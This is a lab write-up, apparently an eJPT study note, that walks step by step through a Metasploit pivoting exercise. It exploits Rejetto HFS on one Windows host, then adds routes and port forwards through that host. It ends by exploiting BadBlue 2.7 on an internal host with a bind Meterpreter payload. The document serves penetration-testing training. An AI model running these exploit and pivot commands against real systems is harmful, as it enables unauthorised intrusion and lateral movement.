# Pivoting with Metasploit - INE eJPT

INE pivoting lab with a detailed Metasploit-centric workflow. Two Windows targets on different network segments: demo1 is reachable and runs HFS, demo2 is internal-only and runs BadBlue. The lab focuses on the complete Metasploit pivot chain: session acquisition, route injection, pivot-tunneled scanning, port forwarding, and bind shell exploitation.

Targets: `demo1.ine.local` | `demo2.ine.local` (internal)

---

## Phase 1 - Compromise demo1

### Host Verification

```bash
ping -c 4 demo1.ine.local
ping -c 4 demo2.ine.local
```

demo1 reachable. demo2 unreachable.

### Enumeration

```bash
nmap demo1.ine.local
nmap -sV -p 80 demo1.ine.local
searchsploit hfs
```

Port 80 - Rejetto HFS.

### Exploitation

```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo1.ine.local
exploit
```

Meterpreter session on demo1. Verify internal network configuration:

```bash
ipconfig
```

Internal subnet identified (e.g. `10.0.19.0/20`).

---

## Phase 2 - Route Injection

```bash
run autoroute -s 10.0.19.0/20
```

Metasploit now routes traffic to the internal subnet through the demo1 session. All subsequent modules targeting internal IPs use this route automatically.

---

## Phase 3 - Pivot-Tunneled Scan

```bash
background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit
```

Port 80 open on demo2.

---

## Phase 4 - Port Forwarding

```bash
sessions -i 1
portfwd add -l 1234 -p 80 -r <demo2_ip>
portfwd list
```

Local port 1234 mirrors port 80 on demo2 through the pivot tunnel.

```bash
nmap -sS -sV -p 1234 localhost
```

Service: BadBlue HTTPd 2.7.

---

## Phase 5 - Exploit demo2

```bash
searchsploit badblue 2.7
background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
exploit
```

Second Meterpreter session obtained on demo2.

---

## Phase 6 - Flag Retrieval

```bash
shell
cd /
dir
type flag.txt
```

---

## Key Takeaways

- The Metasploit pivot chain has four distinct steps: route injection (`autoroute`), pivot-tunneled reconnaissance (`portscan/tcp`), service fingerprinting (`portfwd` + local `nmap`), and exploit delivery.
- `autoroute` is a session-level command - run it inside the active Meterpreter session before backgrounding. The route persists as long as the session is alive.
- Bind TCP payloads are the correct choice when the internal target cannot initiate connections to the attacker. The Metasploit route handles the routing; the bind shell handles the direction.
- `portfwd` enables local tools to interact with internal services as if they were local. This unlocks `nmap -sV` and browser-based fingerprinting against internal hosts.
- Dual sessions (one on demo1, one on demo2) are tracked independently in `sessions`. Managing multiple simultaneous sessions is a core eJPT exam skill.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
